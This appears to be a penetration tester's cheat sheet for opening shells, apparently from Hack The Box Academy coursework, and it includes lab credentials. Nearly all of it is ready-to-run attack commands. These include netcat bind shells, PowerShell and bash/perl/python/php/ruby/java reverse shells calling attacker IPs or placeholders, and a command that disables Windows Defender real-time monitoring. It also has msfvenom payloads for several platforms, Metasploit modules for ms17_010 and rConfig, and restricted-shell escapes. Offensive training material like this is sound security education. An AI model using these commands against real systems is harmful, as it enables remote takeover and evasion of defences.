# Open shells

## CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol
```
xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!
```

## Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use
```
env
```

## Starts a `netcat` listener on a specified port
```
sudo nc -lvnp <port #>
```

## Connects to a netcat listener at the specified IP address and port
```
nc -nv <ip address of computer with listener started><port being listened on>
```

## Uses netcat to bind a shell (`/bin/bash`) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

## `Powershell` one-liner used to connect back to a listener that has been started on an attack box
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Powershell command using to disable real time monitoring in `Windows Defender`
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec`
```
use exploit/windows/smb/psexec
```

## Command used in a meterpreter shell session to drop into a `system shell`
```
shell
```

## `MSFvenom` command used to generate a linux-based reverse shell `stageless payload`
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf
```

## MSFvenom command used to generate a Windows-based reverse shell stageless payload
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe
```

## MSFvenom command used to generate a MacOS-based reverse shell payload
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho
```

## MSFvenom command used to generate a ASP web reverse shell payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp
```

## MSFvenom command used to generate a JSP web reverse shell payload
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp
```

## MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war
```

## Metasploit exploit module used to check if a host is vulnerable to `ms17_010`
```
use auxiliary/scanner/smb/smb_ms17_010
```

## Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010
```
use exploit/windows/smb/ms17_010_psexec
```

## Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting `rConfig 3.9.6`
```
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

## Python command used to spawn an `interactive shell` on a linux-based system
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

## Spawns an interactive shell on a linux-based system
```
/bin/sh -i
```

## Uses `perl` to spawn an interactive shell on a linux-based system
```
perl —e 'exec "/bin/sh";'
```

## Uses `ruby` to spawn an interactive shell on a linux-based system
```
ruby: exec "/bin/sh"
```

## Uses `Lua` to spawn an interactive shell on a linux-based system
```
Lua: os.execute('/bin/sh')
```

## Uses `awk` command to spawn an interactive shell on a linux-based system
```
awk 'BEGIN {system("/bin/sh")}'
```

## Uses `find` command to spawn an interactive shell on a linux-based system
```
find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

## An alternative way to use the `find` command to spawn an interactive shell on a linux-based system
```
find . -exec /bin/sh \; -quit
```

## Uses the text-editor `VIM` to spawn an interactive shell. Can be used to escape "jail-shells"
```
vim -c ':!/bin/sh'
```

## bash reverse shell
```
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
```

## perl reverse shell
```
perl -e 'use Socket;$i="<lhost>";$p=<lport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## python reverse shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<lhost>",<lport>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## php reverse shell
```
php -r '$sock=fsockopen("<lhost>",<lport>);exec("/bin/sh -i <&3 >&3 2>&3");'
```


## ruby reverse shell
```
ruby -rsocket -e'f=TCPSocket.open("<lhost>",<lport>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## [[java]] reverse shell
```java
r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<lhost>/<lport>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()
```

## [[Arsenal/Windows/powershell]] reverse shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient('<lhost>',<lport>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## windows listener autocompletion
```
rlwrap nc -nlvp <port>
```

## interactive reverse shell - and Ctrl+Z (1) 
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## interactive reverse shell - on host - and do fg (2)
```
stty raw -echo
```

## interactive reverse shell - on reverse (3)
```bash
reset
stty rows <ROWS> cols <COLS>
export TERM=xterm-256color
```
